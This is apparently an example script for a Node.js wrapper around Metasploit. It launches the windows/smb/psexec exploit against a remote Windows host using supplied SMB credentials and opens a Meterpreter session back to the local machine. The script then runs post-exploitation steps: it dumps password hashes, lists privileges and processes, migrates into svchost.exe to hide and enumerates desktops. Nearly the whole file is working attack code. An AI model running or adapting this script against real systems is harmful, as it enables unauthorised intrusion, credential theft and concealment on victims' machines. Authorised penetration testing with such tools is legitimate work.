if(process.argv.length <= 5) {
	console.log("node example <localip> <remoteip> <smbuser> <smbpass>");
	return;
}

var msfjs = require('../lib')(),
		async = require('async');

var exploit = new msfjs.Meterpreter("windows/smb/psexec", {
	lhost: 		process.argv[2],
	rhost:  	process.argv[3],
	SMBUser:  process.argv[4],
	SMBPass:  process.argv[5]
});

msfjs.Exploits.launch(exploit, function(status) {

	console.log("Launching windows/smb/psexec at " + process.argv[3]);

	status.on("success", function(session) {

		console.log("Session established from " + session.connection.from.host + ":" + 
									session.connection.from.port + " to " + session.connection.to.host + ":" + session.connection.to.port);

		session.once("prompt", function() {

				var oldpid = null;

			  session.getpid(function(pid) { 
					console.log("Current PID: " + pid) 
					oldpid = pid;
				});
				session.getuid(function(uid) {
					console.log("Current UID: " + uid);
				});
				session.sysinfo(function(info) {
					console.log("Computer name: " + info.computer);
					console.log("Computer arch: " + info.arch);
				});
				session.hashdump(function(hashes) {
					console.log("hashdump got " + hashes.length + " hashes. First username is " + hashes[0].user);
				});
				session.getprivs(function(privs) {
					console.log("current proccess has " + privs.length + " privs.");
				});

				session.ps(function(processes) {
					console.log(processes.length + " proccesses running. First process filename is "+ processes[0].file);

					var proc = null;

					for(var i = 0; i < processes.length; i++) {
						if(processes[i].file == "svchost.exe") {
							proc = processes[i];
						}
					}

					session.migrate(proc.pid, function(err, res) {

						if(!res) {
							console.error("Could not migrate!");
							console.error(err);
							return;
						}

						console.log("PID before migration " + oldpid + ", migrating to " + proc.file + " (" + proc.pid + ")");

						session.getpid(function(newpid) {

							console.log("PID after migration " + newpid);							

						});

					});

				});

				session.enumdesktops(function(desktops) {
								
					console.log("Got " + desktops.length + " desktops. First ones station is " + desktops[0].station);

				});

		});

	});

	status.on("error", function(err) {
		console.error(err);
	});

});
